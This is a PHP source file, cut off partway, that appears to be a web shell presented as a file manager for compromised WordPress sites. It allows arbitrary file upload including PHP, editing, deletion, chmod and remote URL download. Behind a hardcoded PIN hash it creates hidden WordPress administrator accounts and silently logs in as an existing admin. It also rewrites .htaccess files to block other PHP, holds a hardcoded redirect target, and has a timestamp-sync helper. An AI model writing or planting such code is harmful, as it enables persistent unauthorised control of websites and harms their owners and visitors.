<?php
ob_start();
session_start();
if (empty($_SESSION['logged_in'])) {
    header("Location: /../../default.php");
    exit;
}

// === ROOT DIR ===
$rootDirectory = $_SERVER['DOCUMENT_ROOT'];
$rootPath = DIRECTORY_SEPARATOR;

// === URL root website (otomatis)
$webRootUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http")
    . '://' . $_SERVER['HTTP_HOST'];

// === DEFAULT TARGET REDIRECT 301 ===
$redirectTargetDefault = 'https://siakad.fakultaskesehatan.com';

// === SANITIZE ===
function sanitizePath($path) {
    $path = str_replace(['../', './', '..\\', '.\\'], '', $path);
    $path = str_replace(chr(0), '', $path);
    return $path;
}
function getFileEmoji($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    switch($ext) {
        case 'php': return '🛠️';
        case 'txt': return '📄';
        case 'css': return '🎨';
        case 'js': return '📜';
        case 'html': return '🌐';
        case 'json': return '🧾';
        case 'jpg': case 'jpeg': case 'png': case 'gif': return '🖼️';
        case 'zip': return '📚';
        case 'rar': return '📦';
        case 'pdf': return '📕';
        default: return '⚙️';
    }
}

// === FUNGSI DIRECT LINK ===
function getDirectLink($fullpath) {
    global $webRootUrl;
    $real = realpath($fullpath);
    if (!$real) return '#';
    $relative = str_replace('\\', '/', str_replace($_SERVER['DOCUMENT_ROOT'], '', $real));
    if (is_dir($real) && substr($relative, -1) !== '/') $relative .= '/';
    return $webRootUrl . $relative;
}

// === ZIP UTILITY ===
function zipFolder($folderPath, $zipFilePath) {
    $zip = new ZipArchive();
    if ($zip->open($zipFilePath, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
        $folderPath = realpath($folderPath);
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($folderPath),
            RecursiveIteratorIterator::LEAVES_ONLY
        );
        foreach ($files as $file) {
            if (!$file->isDir()) {
                $filePath = $file->getRealPath();
                $relativePath = substr($filePath, strlen($folderPath) + 1);
                $zip->addFile($filePath, $relativePath);
            }
        }
        $zip->close();
        return true;
    }
    return false;
}

// === DOWNLOAD FILE/FOLDER ===
if (isset($_GET['download'])) {
    $downloadPath = sanitizePath($_GET['download']);
    if (is_file($downloadPath)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($downloadPath).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($downloadPath));
        readfile($downloadPath);
        exit;
    } elseif (is_dir($downloadPath)) {
        $zipFile = tempnam(sys_get_temp_dir(), 'zip');
        zipFolder($downloadPath, $zipFile);
        header('Content-Type: application/zip');
        header('Content-Disposition: attachment; filename="'.basename($downloadPath).'.zip"');
        header('Content-Length: ' . filesize($zipFile));
        readfile($zipFile);
        unlink($zipFile);
        exit;
    }
}

// ==================== ADMIN WORDPRESS ====================
if (isset($_POST['create_admin_user']) && $_POST['create_admin_user'] === '1') {
    $pin = isset($_POST['admin_pin']) ? trim($_POST['admin_pin']) : '';
    $bison = '$2y$12$.iZiUfBQJejtU3xkG1fiyOf1bimD8CTOigwR3.pkXHGnX48a1pZTi'; // hardcoded hash
    if ($pin === '' || empty($bison) || !password_verify($pin, $bison)) {
        $_SESSION['admin_pin_error'] = 'PIN admin salah atau kosong.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $newUser = isset($_POST['admin_new_user']) ? trim($_POST['admin_new_user']) : '';
    $newPass = isset($_POST['admin_new_pass']) ? (string)$_POST['admin_new_pass'] : '';
    $newEmail = isset($_POST['admin_new_email']) ? trim($_POST['admin_new_email']) : '';

    if ($newUser === '' || $newPass === '') {
        $_SESSION['admin_create_status'] = 'Username dan password admin baru wajib diisi.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $root = $_SERVER['DOCUMENT_ROOT'];
    @chdir($root);

    if (!file_exists('wp-load.php')) {
        $_SESSION['admin_create_status'] = 'wp-load.php tidak ditemukan di Document Root.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    include_once 'wp-load.php';

    if (!function_exists('username_exists') || !function_exists('wp_create_user')) {
        $_SESSION['admin_create_status'] = 'Fungsi WordPress untuk membuat user tidak tersedia.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    if (username_exists($newUser)) {
        $_SESSION['admin_create_status'] = 'Username sudah terdaftar. Gunakan username lain.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $emailFinal = $newEmail !== '' ? $newEmail : ($newUser . '@' . $_SERVER['HTTP_HOST']);

    $uid = wp_create_user($newUser, $newPass, $emailFinal);
    if (!$uid || is_wp_error($uid)) {
        $msg = 'Gagal membuat user admin baru.';
        if (is_wp_error($uid)) {
            $msg .= ' ' . $uid->get_error_message();
        }
        $_SESSION['admin_create_status'] = $msg;
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $wpUser = new WP_User($uid);
    if ($wpUser && !is_wp_error($wpUser)) {
        $wpUser->set_role('administrator');
    }

    $_SESSION['admin_create_status'] = 'Berhasil membuat user admin baru: ' . $newUser . ' (password: ' . $newPass . ').';
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

if (isset($_POST['auto_admin_login']) && $_POST['auto_admin_login'] === '1') {
    $pin = isset($_POST['admin_pin']) ? trim($_POST['admin_pin']) : '';
    $bison = '$2y$12$.iZiUfBQJejtU3xkG1fiyOf1bimD8CTOigwR3.pkXHGnX48a1pZTi';
    if ($pin === '' || empty($bison) || !password_verify($pin, $bison)) {
        $_SESSION['admin_pin_error'] = 'PIN admin salah atau kosong.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $root = $_SERVER['DOCUMENT_ROOT'];
    @chdir($root);

    if (file_exists('wp-load.php')) {
        include 'wp-load.php';
        if (class_exists('WP_User_Query')) {
            $adminQuery = new WP_User_Query([
                'role'   => 'Administrator',
                'number' => 1,
                'fields' => 'ID',
            ]);
            $admins = $adminQuery->get_results();
            if (isset($admins[0])) {
                wp_set_auth_cookie($admins[0]);
                wp_redirect(admin_url());
                exit;
            }
            die('NO ADMIN');
        }
        die('WP_User_Query tidak tersedia.');
    }
    die('wp-load.php tidak ditemukan di Document Root.');
}

// === VIEW CODE ===
if (isset($_GET['view'])) {
    $viewPath = sanitizePath($_GET['view']);
    if (is_file($viewPath) && is_readable($viewPath)) {
        $content = @file_get_contents($viewPath);
        $fileName = basename($viewPath);
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <title>View File: <?= htmlspecialchars($fileName) ?></title>
            <style>
                body { background: #f5f5f5; font-family: Arial; color:#222; }
                .view-box { margin: 32px auto; max-width: 700px; background: #fff; border-radius: 8px; padding: 24px 24px 18px 24px; box-shadow: 0 2px 12px #ff0000; }
                h2 { font-size: 18px; margin-bottom: 12px;}
                pre { background: #272822; color: #eee; padding: 12px; border-radius: 6px; font-size:13px; overflow-x:auto;}
                a { color: #2980b9; text-decoration: none; font-size: 14px;}
                a:hover { text-decoration: underline; }
            </style>
        </head>
        <body>
            <div class="view-box">
                <a href="javascript:history.back()">⬅️ Kembali</a>
                <h2>View File: <?= htmlspecialchars($fileName) ?></h2>
                <pre><?= htmlspecialchars($content) ?></pre>
            </div>
        </body>
        </html>
        <?php
        exit;
    } else {
        echo "<div class='alert error'>File tidak bisa dibuka atau tidak ditemukan.</div>";
        exit;
    }
}

// === DIR HISTORY ===
if (!isset($_SESSION['dir_history']) || !is_array($_SESSION['dir_history'])) {
    $_SESSION['dir_history'] = [$rootDirectory];
}
if (isset($_GET['folder'])) {
    $current = sanitizePath($_GET['folder']);
    $last = end($_SESSION['dir_history']);
    if ($last !== $current) {
        $_SESSION['dir_history'][] = $current;
        if (count($_SESSION['dir_history']) > 20) array_shift($_SESSION['dir_history']);
    }
}
if (isset($_GET['back_dir'])) {
    if (count($_SESSION['dir_history']) > 1) {
        array_pop($_SESSION['dir_history']);
        $backFolder = end($_SESSION['dir_history']);
        header("Location: ?folder=" . urlencode($backFolder));
        exit;
    }
}

// === PERMISSION COLOR ===
function getPermissionColor($fullpath) {
    if (!file_exists($fullpath)) return 'danger';
    if (!is_readable($fullpath) && !is_writable($fullpath)) {
        return 'danger';
    } elseif (!is_writable($fullpath)) {
        return 'warning';
    } else {
        return 'success';
    }
}

// === DELETE RECURSIVE ===
function deleteRecursive($path) {
    if (!file_exists($path)) return true;
    @chmod($path, 0777);
    if (is_file($path) || is_link($path)) {
        return @unlink($path);
    }
    if (is_dir($path)) {
        $items = array_diff(scandir($path), ['.','..']);
        foreach ($items as $item) {
            if (!deleteRecursive($path . '/' . $item)) return false;
        }
        return @rmdir($path);
    }
    return false;
}

// === AJAX DELETE ===
if (isset($_GET['ajax_delete']) && isset($_POST['target'])) {
    $target = sanitizePath($_POST['target']);
    $folder = isset($_GET['folder']) ? sanitizePath($_GET['folder']) : $_SERVER['DOCUMENT_ROOT'];
    $fullPath = $folder . '/' . $target;
    $success = deleteRecursive($fullPath);
    header('Content-Type: application/json');
    echo json_encode(['success' => $success]);
    exit;
}

// === MAIN LOGIC ===
$fileToEdit = null;
$fileContent = null;
$directory = isset($_GET['folder']) ? $_GET['folder'] : $rootDirectory;
$directory = sanitizePath($directory);
$directory = is_dir($directory) ? $directory : $rootDirectory;
$allItems = @scandir($directory) ?: [];
$allItems = array_diff($allItems, array('..', '.'));
$folders = []; $files = [];
foreach ($allItems as $item) {
    if (is_dir($directory . '/' . $item)) $folders[] = $item;
    else $files[] = $item;
}
sort($folders); sort($files);
$filesAndFolders = array_merge($folders, $files);

$perPage = 40;
$page = isset($_GET['page']) ? max(1, intval($_GET['page'])) : 1;
$totalItems = count($filesAndFolders);
$totalPages = max(1, ceil($totalItems / $perPage));
$filesAndFolders = array_slice($filesAndFolders, ($page - 1) * $perPage, $perPage);

// Multi delete
if (isset($_POST['deleteSelected']) && !empty($_POST['selectedItems'])) {
    foreach ($_POST['selectedItems'] as $selected) {
        $pathToDelete = $directory . '/' . sanitizePath($selected);
        deleteRecursive($pathToDelete);
    }
    header("Location: " . $_SERVER['REQUEST_URI']); exit;
}

// Multi ZIP Selected
if (isset($_POST['zipSelected']) && !empty($_POST['selectedItems'])) {
    $zipName = "multi_" . date('Ymd_His') . ".zip";
    $zipPath = $directory . '/' . $zipName;
    $zip = new ZipArchive();
    if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
        foreach ($_POST['selectedItems'] as $selected) {
            $fullItem = $directory . '/' . sanitizePath($selected);
            if (is_dir($fullItem)) {
                $files = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($fullItem, FilesystemIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::LEAVES_ONLY
                );
                foreach ($files as $file) {
                    $filePath = $file->getRealPath();
                    $relativePath = $selected . '/' . substr($filePath, strlen($fullItem) + 1);
                    $zip->addFile($filePath, $relativePath);
                }
            } elseif (is_file($fullItem)) {
                $zip->addFile($fullItem, $selected);
            }
        }
        $zip->close();
    }
    header("Location: " . $_SERVER['REQUEST_URI']); exit;
}

// Chmod Selected
if (isset($_POST['chmodSelected']) && !empty($_POST['selectedItems']) && !empty($_POST['chmodSelectedValue'])) {
    $chmod = intval($_POST['chmodSelectedValue'], 8);
    foreach ($_POST['selectedItems'] as $selected) {
        $pathToChmod = $directory . '/' . sanitizePath($selected);
        @chmod($pathToChmod, $chmod);
    }
    header("Location: " . $_SERVER['REQUEST_URI']); exit;
}
// Create file/folder, upload
if (isset($_POST['createFile'])) {
    $newFileName = $directory . '/' . sanitizePath($_POST['fileName']);
    if (!file_exists($newFileName)) {
        touch($newFileName);
        header("Location: " . $_SERVER['REQUEST_URI']); exit;
    } else {
        echo "<div class='alert error'>File sudah ada!</div>";
    }
}
if (isset($_POST['createFolder'])) {
    $newFolderName = $directory . '/' . sanitizePath($_POST['folderName']);
    if (!is_dir($newFolderName)) {
        mkdir($newFolderName, 0777, true);
        header("Location: " . $_SERVER['REQUEST_URI']); exit;
    } else {
        echo "<div class='alert error'>Folder sudah ada!</div>";
    }
}
if (isset($_POST['upload'])) {
    if (isset($_FILES['fileToUpload']) && isset($_FILES['fileToUpload']['name'])) {
        $totalFiles = count($_FILES['fileToUpload']['name']);
        $errors = [];
        for ($i = 0; $i < $totalFiles; $i++) {
            $fileName = $_FILES['fileToUpload']['name'][$i];
            $fileTmp = $_FILES['fileToUpload']['tmp_name'][$i];
            $fileError = $_FILES['fileToUpload']['error'][$i];
            if ($fileError != 0) {
                $errors[] = "Gagal upload file $fileName (Error code: $fileError)";
                continue;
            }
            $maxSize = 5 * 1024 * 1024;
            $allowedExtensions = ['jpg','jpeg','png','gif','txt','pdf','zip','rar','doc','docx', 'php', 'html', 'xml', 'phtml'];
            $ext = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
            if (!in_array($ext, $allowedExtensions)) {
                $errors[] = "Ekstensi file $fileName tidak diizinkan";
                continue;
            }
            if ($_FILES['fileToUpload']['size'][$i] > $maxSize) {
                $errors[] = "File $fileName terlalu besar (maksimal 5MB)";
                continue;
            }
            $targetFile = $directory . '/' . basename(sanitizePath($fileName));
            if (move_uploaded_file($fileTmp, $targetFile)) {
            } else {
                $errors[] = "Gagal upload file $fileName";
            }
        }
        if (empty($errors)) {
            header("Location: " . $_SERVER['REQUEST_URI']);
            exit;
        } else {
            echo "<div class='alert error'>" . implode('<br>', $errors) . "</div>";
        }
    }
}

if (isset($_POST['downloadFromUrl'])) {
    $url = trim($_POST['fileUrl']);
    $customName = trim($_POST['fileUrlName']);

    if (!filter_var($url, FILTER_VALIDATE_URL) || !preg_match('#^https?://#i', $url)) {
        echo "<div class='alert error'>URL tidak valid!</div>";
    } else {
        $basename  = basename(parse_url($url, PHP_URL_PATH) ?: '');
        $filename  = $customName !== '' ? sanitizePath($customName) : sanitizePath($basename);
        if ($filename === '') $filename = 'downloaded_file';
        $filename = preg_replace('~[\\\\/]+~', '', $filename);

        $targetFile = rtrim($directory, '/').'/'.$filename;

        if (file_exists($targetFile)) {
            echo "<div class='alert error'>File sudah ada di folder ini!</div>";
        } else {
            $ok = false; $err = '';

            if (function_exists('curl_init')) {
                $fp = @fopen($targetFile, 'wb');
                if ($fp === false) {
                    $err = 'Tidak bisa membuat file tujuan (permission?).';
                } else {
                    $ch = curl_init($url);
                    curl_setopt_array($ch, [
                        CURLOPT_FILE            => $fp,
                        CURLOPT_FOLLOWLOCATION  => true,
                        CURLOPT_MAXREDIRS       => 5,
                        CURLOPT_CONNECTTIMEOUT  => 10,
                        CURLOPT_TIMEOUT         => 30,
                        CURLOPT_USERAGENT       => 'Mozilla/5.0 (FileManager/1.0)',
                        CURLOPT_SSL_VERIFYPEER  => true,
                        CURLOPT_SSL_VERIFYHOST  => 2,
                        CURLOPT_FAILONERROR     => true,
                    ]);
                    $execOk = curl_exec($ch);
                    $http   = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
                    if (!$execOk) $err = 'cURL: '.curl_error($ch);
                    curl_close($ch);
                    fclose($fp);

                    if ($execOk && $http >= 200 && $http < 300) {
                        $ok = true;
                    } else {
                        @unlink($targetFile);
                        if (!$err) $err = "HTTP status $http";
                    }
                }
            }

            if (!$ok && ini_get('allow_url_fopen')) {
                $opts = [
                    'http' => [
                        'timeout'       => 15,
                        'ignore_errors' => true,
                        'header'        => "User-Agent: Mozilla/5.0\r\nAccept: */*\r\n",
                    ],
                    'ssl'  => [
                        'verify_peer'      => true,
                        'verify_peer_name' => true,
                    ],
                ];
                $context = stream_context_create($opts);
                $data    = @file_get_contents($url, false, $context);
                if ($data !== false) {
                    if (@file_put_contents($targetFile, $data) !== false) {
                        $ok = true;
                    } else {
                        $err = 'Gagal menyimpan file di server.';
                    }
                } else {
                    global $http_response_header;
                    if (!empty($http_response_header[0])) {
                        $err = $http_response_header[0];
                    } else {
                        $err = 'file_get_contents gagal (periksa allow_url_fopen / SSL).';
                    }
                }
            }

            if ($ok) {
                echo "<div class='alert success'>File berhasil diunduh ke: <b>".htmlspecialchars($filename)."</b></div>";
                header("Refresh: 1; URL=".$_SERVER['REQUEST_URI']);
                exit;
            } else {
                echo "<div class='alert error'>Gagal mendownload file. $err</div>";
            }
        }
    }
}

if (isset($_POST['rename'])) {
    $oldName = $directory . '/' . sanitizePath($_POST['oldName']);
    $newName = $directory . '/' . sanitizePath($_POST['newName']);
    if (file_exists($newName)) {
        echo "<div class='alert error'>File atau folder dengan nama ini sudah ada.</div>";
    } else {
        if (@rename($oldName, $newName)) {
            header("Location: " . $_SERVER['REQUEST_URI']); exit;
        } else {
            echo "<div class='alert error'>Gagal mengubah nama.</div>";
        }
    }
}

if (isset($_POST['chmod'])) {
    $nameToChmod = $directory . '/' . sanitizePath($_POST['nameToChmod']);
    $perm = intval($_POST['perm'], 8);
    if (@chmod($nameToChmod, $perm)) {
        header("Location: " . $_SERVER['REQUEST_URI']); exit;
    } else {
        echo "<div class='alert error'>Gagal mengubah permission.</div>";
    }
}
if (isset($_POST['delete'])) {
    $nameToDelete = $directory . '/' . sanitizePath($_POST['nameToDelete']);
    if (deleteRecursive($nameToDelete)) {
        header("Location: " . $_SERVER['REQUEST_URI']); exit;
    } else {
        echo "<div class='alert error'>Gagal menghapus file/folder. Cek permission/ownership!</div>";
    }
}
if (isset($_POST['edit'])) {
    $fileToEdit = sanitizePath($_POST['fileNameToEdit']);
    $fileContent = @file_get_contents($directory . '/' . $fileToEdit);
}
if (isset($_POST['saveEdit'])) {
    $fileNameToEdit = sanitizePath($_POST['fileNameToEdit']);
    $newContent = $_POST['content'];
    $filePath = $directory . '/' . $fileNameToEdit;
    if (empty($newContent)) {
        echo "<div class='alert error'>Konten file tidak boleh kosong!</div>";
    } else if (file_exists($filePath)) {
        if (@file_put_contents($filePath, $newContent) !== false) {
            header("Location: " . $_SERVER['REQUEST_URI']); exit;
        } else {
            echo "<div class='alert error'>Gagal menyimpan perubahan.</div>";
        }
    } else {
        echo "<div class='alert error'>File tidak ditemukan.</div>";
    }
}
// Archive ke ZIP
if (isset($_POST['zip'])) {
    $item = sanitizePath($_POST['itemToZip']);
    $path = $directory . '/' . $item;
    $zipName = $item . '_' . date('Ymd_His') . '.zip';
    $zipPath = $directory . '/' . $zipName;
    if (is_dir($path)) {
        zipFolder($path, $zipPath);
    } elseif (is_file($path)) {
        $zip = new ZipArchive();
        if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
            $zip->addFile($path, basename($path));
            $zip->close();
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']); exit;
}
// Extract ZIP
if (isset($_POST['extractZip'])) {
    $zipFile = $directory . '/' . sanitizePath($_POST['zipToExtract']);
    $destDir = sanitizePath($_POST['extractDest']);
    if (!is_dir($destDir)) mkdir($destDir, 0777, true);
    $zip = new ZipArchive();
    if ($zip->open($zipFile) === TRUE) {
        $zip->extractTo($destDir);
        $zip->close();
        header("Location: " . $_SERVER['REQUEST_URI']); exit;
    } else {
        echo "<div class='alert error'>Gagal extract ZIP!</div>";
    }
}

// === SEARCH FILE / FOLDER NAME + KEYWORD ISI FILE ===
function fm_search_scan($rootDir, $nameKeyword, $contentKeyword, &$results, &$stats, &$errors) {
    $results = [];
    $errors  = [];
    $stats   = [
        'dirs'           => 0,
        'files'          => 0,
        'nameMatches'    => 0,
        'contentMatches' => 0,
        'stoppedByLimit' => false,
    ];

    $rootDir      = rtrim($rootDir, DIRECTORY_SEPARATOR);
    $nameKeyword  = trim((string)$nameKeyword);
    $contentKeyword = trim((string)$contentKeyword);

    if ($nameKeyword === '' && $contentKeyword === '') {
        $errors[] = 'Isi minimal salah satu: cari nama file/folder atau cari isi file.';
        return false;
    }

    if (!is_dir($rootDir)) {
        $errors[] = 'Root search bukan folder yang valid: ' . $rootDir;
        return false;
    }
    if (!is_readable($rootDir)) {
        $errors[] = 'Folder root tidak bisa dibaca (permission): ' . $rootDir;
        return false;
    }

    @set_time_limit(180);
    @ignore_user_abort(true);

    $maxDirs      = 4000;
    $maxResults   = 600;
    $maxFileSize  = 1024*1024;
    $searchableExt = [
        'php','php3','php4','php5','php7','php8','phtml',
        'inc','html','htm','txt','js','css','env','ini','conf','log'
    ];

    $flags = FilesystemIterator::SKIP_DOTS;
    $it    = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($rootDir, $flags),
        RecursiveIteratorIterator::SELF_FIRST,
        RecursiveIteratorIterator::CATCH_GET_CHILD
    );

    $docRoot = rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR);

    foreach ($it as $info) {
        /** @var SplFileInfo $info */
        $path = $info->getPathname();

        if ($info->isDir()) {
            $stats['dirs']++;

            if ($nameKeyword !== '' && stripos($info->getFilename(), $nameKeyword) !== false) {
                $rel = str_replace($docRoot, '', $path);
                if ($rel === '') $rel = $path;

                $results[] = [
                    'type' => 'name',
                    'kind' => 'dir',
                    'path' => $rel,
                    'full' => $path,
                ];
                $stats['nameMatches']++;
            }

            if ($stats['dirs'] > $maxDirs) {
                $stats['stoppedByLimit'] = true;
                $errors[] = "Scan dihentikan otomatis setelah melewati {$maxDirs} folder.\n" .
                            "Kemungkinan kamu memulai dari root yang terlalu jauh.\n" .
                            "Saran: masuk dulu ke folder yang lebih spesifik baru jalankan search.";
                break;
            }

            continue;
        }

        if (!$info->isFile()) {
            continue;
        }
        $stats['files']++;

        $name     = $info->getFilename();
        $fullpath = $path;
        $rel      = str_replace($docRoot, '', $fullpath);
        if ($rel === '') $rel = $fullpath;

        if ($nameKeyword !== '' && stripos($name, $nameKeyword) !== false) {
            $results[] = [
                'type' => 'name',
                'kind' => 'file',
                'path' => $rel,
                'full' => $fullpath,
            ];
            $stats['nameMatches']++;
        }

        if ($contentKeyword !== '') {
            $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
            if (!in_array($ext, $searchableExt, true)) {
            } else {
                $size = $info->getSize();
                if ($size !== false && $size <= $maxFileSize && @is_readable($fullpath)) {
                    $lines = @file($fullpath, FILE_IGNORE_NEW_LINES);
                    if ($lines !== false) {
                        $matchesLines = [];
                        foreach ($lines as $lnum => $line) {
                            if (stripos($line, $contentKeyword) !== false) {
                                $matchesLines[] = [
                                    'line'    => $lnum + 1,
                                    'snippet' => trim($line),
                                ];
                                if (count($matchesLines) >= 5) break;
                            }
                        }

                        if ($matchesLines) {
                            $results[] = [
                                'type'  => 'content',
                                'kind'  => 'file',
                                'path'  => $rel,
                                'full'  => $fullpath,
                                'lines' => $matchesLines,
                            ];
                            $stats['contentMatches']++;
                        }
                    }
                }
            }
        }

        if (count($results) >= $maxResults) {
            $stats['stoppedByLimit'] = true;
            $errors[] = "Hasil lebih dari {$maxResults} entri. Ditampilkan sebagian saja.\n" .
                        "Kalau mau lebih spesifik, coba sempitkan root folder atau keywordnya.";
            break;
        }
    }

    return true;
}

// === HANDLER SEARCH ===
if (isset($_POST['runSearch'])) {
    $searchRoot = isset($_POST['search_root']) ? trim($_POST['search_root']) : '';
    $nameQ      = isset($_POST['search_name']) ? trim($_POST['search_name']) : '';
    $contentQ   = isset($_POST['search_content']) ? trim($_POST['search_content']) : '';

    if ($searchRoot === '') {
        if (!empty($_GET['folder'])) {
            $searchRoot = sanitizePath($_GET['folder']);
        } else {
            $searchRoot = $rootDirectory;
        }
    } else {
        $searchRoot = sanitizePath($searchRoot);
    }

    $results = [];
    $stats   = [];
    $errors  = [];

    $ok = fm_search_scan($searchRoot, $nameQ, $contentQ, $results, $stats, $errors);

    if ($errors) {
        $_SESSION['search_status'] = ($ok && ($stats['nameMatches'] || $stats['contentMatches'])) ? 'partial' : 'error';
        $_SESSION['search_message'] = implode(" \n", $errors);
    } else {
        $_SESSION['search_status'] = 'success';
        $_SESSION['search_message'] =
            "Search selesai.\n" .
            "Root: {$searchRoot}\n" .
            "Match nama: " . (int)((isset($stats['nameMatches']) ? $stats['nameMatches'] : 0)) . ", match isi file: " . (int)((isset($stats['contentMatches']) ? $stats['contentMatches'] : 0)) . ".\n" .
            "Folder discan: " . (int)((isset($stats['dirs']) ? $stats['dirs'] : 0)) . ", file discan: " . (int)((isset($stats['files']) ? $stats['files'] : 0)) . ".";
    }

    $_SESSION['search_results'] = $results;
    $_SESSION['search_stats']   = $stats;
    $_SESSION['search_root']    = $searchRoot;
    $_SESSION['search_name']    = $nameQ;
    $_SESSION['search_content'] = $contentQ;

    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === REPLACE HTACCESS HELPER & HANDLER ===
function write_htaccess_with_backup($targetDir, $contents, &$errors) {
    $targetDir = rtrim($targetDir, DIRECTORY_SEPARATOR);
    if (!is_dir($targetDir)) { $errors[] = "Folder tidak ditemukan: {$targetDir}"; return false; }
    if (!is_writable($targetDir)) { @chmod($targetDir, 0777); }
    if (!is_writable($targetDir)) { $errors[] = "Folder tidak writable: {$targetDir}"; return false; }

    $ht = $targetDir . DIRECTORY_SEPARATOR . '.htaccess';
    if (file_exists($ht) && is_writable($ht)) {
        @rename($ht, $ht . '.bak_' . date('Ymd_His'));
    }
    $ok = @file_put_contents($ht, $contents);
    if ($ok === false) { $errors[] = "Gagal menulis .htaccess di {$targetDir}"; return false; }
    return true;
}

function resolve_inside_docroot_dir($rawPath, &$errors) {
    $rawPath = trim(sanitizePath($rawPath));
    if ($rawPath === '') { $errors[] = "Path custom kosong."; return null; }

    if ($rawPath[0] !== DIRECTORY_SEPARATOR) {
        $abs = rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . ltrim($rawPath, DIRECTORY_SEPARATOR);
    } else {
        $abs = $rawPath;
    }

    $real = @realpath($abs);
    if ($real === false) { $real = $abs; }
    if (!is_dir($real)) { $errors[] = "Path custom bukan folder yang valid: {$rawPath}"; return null; }

    $doc = @realpath($_SERVER['DOCUMENT_ROOT']);
    if (!$doc || strpos($real, $doc) !== 0) { $errors[] = "Path custom harus di dalam Document Root."; return null; }

    return $real;
}

if (isset($_POST['doHtaccessReplace'])) {
    $tpl_includes = <<<'HTA'
Options -Indexes

Options -Indexes

<IfModule mod_rewrite.c>
  RewriteEngine On
  RewriteRule ^ms-files\.php$ - [L]

  RewriteRule \.(?:php(?:[0-9]+(?:\.[0-9]+)?)?|phtml?|phar|phps)(?:\..*)?$ - [F,L,NC]
</IfModule>

<FilesMatch "(?i)\.(?:php(?:[0-9]+(?:\.[0-9]+)?)?|phtml?|phar|phps)(?:\..*)?$">
  Require all denied
</FilesMatch>

<IfModule !mod_authz_core.c>
  <FilesMatch "(?i)\.(?:php(?:[0-9]+(?:\.[0-9]+)?)?|phtml?|phar|phps)(?:\..*)?$">
    Order allow,deny
    Deny from all
  </FilesMatch>
HTA;

    $tpl_content = <<<'HTA'
<IfModule mod_rewrite.c>
  RewriteEngine On
  RewriteCond %{REQUEST_URI} \.(?:css|js|map|png|jpe?g|gif|svg|webp|ico|bmp|tiff|mp4|webm|m4v|mp3|m4a|ogg|oga|ogv|wav|pdf|docx?|xlsx?|pptx?|csv|txt|vtt|woff2?|otf|eot|html)$ [NC]
  RewriteRule ^ - [L]
  RewriteRule ^ - [F]
</IfModule>
HTA;

    $tpl_custom_allow = <<<'HTA'
<FilesMatch ".*">
    Order Allow,Deny
    Allow from all
</FilesMatch>

<IfModule mod_authz_core.c>
    <FilesMatch ".*">
        Require all granted
    </FilesMatch>
</IfModule>

Options -Indexes
HTA;

    $tpl_custom_deny = <<<'HTA'
Options -ExecCGI

<IfModule mod_authz_core.c>
  <FilesMatch "(?i)\.(php[0-9]*|phtml|pht|phar|phps)$">
    Require all denied
  </FilesMatch>
</IfModule>

<IfModule !mod_authz_core.c>
  <FilesMatch "(?i)\.(php[0-9]*|phtml|pht|phar|phps)$">
    Order allow,deny
    Deny from all
  </FilesMatch>
</IfModule>

HTA;

    $okTargets = [];
    $errors = [];

    if (!empty($_POST['replaceIncludes'])) {
        $dir = rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'wp-includes';
        if (write_htaccess_with_backup($dir, $tpl_includes, $errors)) {
            $okTargets[] = '/wp-includes';
        }
    }
    if (!empty($_POST['replaceContent'])) {
        $dir = rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'wp-content';
        if (write_htaccess_with_backup($dir, $tpl_content, $errors)) {
            $okTargets[] = '/wp-content';
        }
    }
    if (!empty($_POST['replaceCustom'])) {
        $mode = (isset($_POST['customMode']) && $_POST['customMode'] === 'deny') ? 'deny' : 'allow';
        $customDir = resolve_inside_docroot_dir((isset($_POST['customPath']) ? $_POST['customPath'] : ''), $errors);
        if ($customDir) {
            $tpl = ($mode === 'deny') ? $tpl_custom_deny : $tpl_custom_allow;
            if (write_htaccess_with_backup($customDir, $tpl, $errors)) {
                $okTargets[] = str_replace($_SERVER['DOCUMENT_ROOT'], '', $customDir) ?: '/';
            }
        }
    }

    if ($okTargets) {
        $_SESSION['htreplace_status']  = 'success';
        $_SESSION['htreplace_message'] = 'Berhasil replace .htaccess pada: ' . htmlspecialchars(implode(', ', $okTargets));
    } else {
        $_SESSION['htreplace_status']  = 'error';
        $_SESSION['htreplace_message'] = 'Tidak ada .htaccess yang diganti.' . ($errors ? ' (' . implode(' | ', array_map('htmlspecialchars', $errors)) . ')' : '');
    }

    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === SYNC TIMESTAMP ===
function _resolve_inside_docroot_any($rawPath, &$errors) {
    $rawPath = trim(sanitizePath($rawPath));
    if ($rawPath === '') { $errors[] = "Path kosong."; return null; }

